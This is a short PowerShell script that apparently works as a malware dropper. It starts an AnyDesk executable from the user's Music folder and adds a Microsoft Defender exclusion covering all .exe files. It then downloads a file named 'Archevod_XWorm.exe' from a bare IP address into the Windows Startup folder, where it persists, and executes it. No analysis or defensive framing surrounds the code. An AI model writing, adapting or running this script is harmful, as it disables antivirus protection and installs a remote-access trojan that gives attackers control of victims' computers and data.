start-process "c:\users\$env:username\Music/AnyDesk.exe"

Add-MpPreference -ExclusionExtension ".exe"

Start-Sleep -Seconds 3

$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/Archevod_XWorm.exe'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Archevod_XWorm.exe"
$down.DownloadFile($url, $file)

$exec = New-Object -ComObject shell.application
$exec.ShellExecute($file);